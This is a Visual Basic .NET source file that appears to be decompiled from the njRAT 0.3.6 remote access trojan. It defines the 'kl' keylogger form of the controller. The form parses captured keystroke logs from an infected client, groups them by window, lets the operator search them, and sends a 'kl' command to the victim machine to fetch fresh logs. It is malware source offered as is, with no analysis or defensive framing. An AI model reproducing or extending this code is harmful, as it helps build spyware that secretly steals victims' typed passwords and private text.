Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports njRAT_0._3._6.njRAT

Public Class kl

    Public c As Client
    Private last As ListViewItem

    Public Sub New()
        Me.last = Nothing
        Me.InitializeComponent()
    End Sub

    Private Sub CopyToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyToolStripMenuItem.Click
        Me.T1.Copy()
    End Sub

    Private Sub FindToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FindToolStripMenuItem.Click
        Dim str As String = Interaction.InputBox("Enter Word To Find", "Search", "", -1, -1)
        If (str.Length <> 0) Then
            Try
                Dim enumerator As IEnumerator
                Try
                    enumerator = Me.L1.Items.GetEnumerator
                    Do While enumerator.MoveNext
                        Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                        current.ForeColor = Color.Black
                        If ((Not current.Tag Is Nothing) AndAlso current.Tag.ToString.ToLower.Contains(str.ToLower)) Then
                            current.ForeColor = Color.Blue
                        End If
                    Loop
                Finally
                    If TypeOf enumerator Is IDisposable Then
                        TryCast(enumerator, IDisposable).Dispose()
                    End If
                End Try
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                ProjectData.ClearProjectError()
            End Try
        End If
    End Sub
    Public Sub insert(ByVal T As String)
        Dim strArray As String() = Strings.Split(T, "#;", -1, CompareMethod.Binary)
        If (strArray.Length = 3) Then
            If Not Me.L1.Items.ContainsKey(T) Then
                Me.last = Me.L1.Items.Add(T, strArray(1), 0)
                Me.last.SubItems.Add(strArray(2))
                Me.last.SubItems.Add(strArray(0))
            Else
                Me.last = Me.L1.Items.Item(T)
            End If
            Me.T1.SelectionStart = Me.T1.TextLength
            Me.T1.SelectionColor = Color.SteelBlue
        ElseIf (Not Me.last Is Nothing) Then
            Me.last.Tag = Operators.ConcatenateObject(Operators.ConcatenateObject(Me.last.Tag, T), ChrW(13) & ChrW(10))
        Else
            If Not Me.L1.Items.ContainsKey("??") Then
                Me.L1.Items.Add("??", "??", 0)
            End If
            Me.last = Me.L1.Items.Item("??")
            Me.last.Tag = Operators.ConcatenateObject(Operators.ConcatenateObject(Me.last.Tag, T), ChrW(13) & ChrW(10))
        End If
    End Sub

    Private Sub kl_Resize(sender As Object, e As EventArgs) Handles Me.Resize
        Me.L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
    End Sub

    Private Sub L1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles L1.SelectedIndexChanged
        If (Me.L1.SelectedItems.Count <> 0) Then
            Me.T1.Text = Conversions.ToString(Me.L1.SelectedItems.Item(0).Tag)
        End If
    End Sub

    Private Sub ReToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ReToolStripMenuItem.Click
        Try
            Me.c.Send("kl")
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub SelectAllToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SelectAllToolStripMenuItem.Click
        Me.T1.SelectAll()
    End Sub
End Class